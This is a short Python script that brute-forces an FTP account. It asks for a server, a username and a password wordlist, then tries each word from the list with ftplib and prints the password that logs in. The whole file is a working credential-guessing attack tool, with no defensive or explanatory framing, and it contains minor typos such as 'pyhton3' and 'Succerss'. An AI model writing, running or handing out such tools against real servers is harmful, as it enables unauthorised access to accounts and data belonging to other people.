#! /usr/bin/pyhton3

import ftplib

server = input("FTP server:")
user = input("username:")
passwordlist = input("Path to Password List >")

try:
    with open(passwordlist, "r") as pw:
        for word in pw:
            word = word.strip("\r").strip("\n")

            try:
                ftp = ftplib.FTP(server)
                ftp.login(user,word)
                print("Succerss! The password is "+ word)

            except:

                print("still trying...")

except:

    print("WordList Error")
    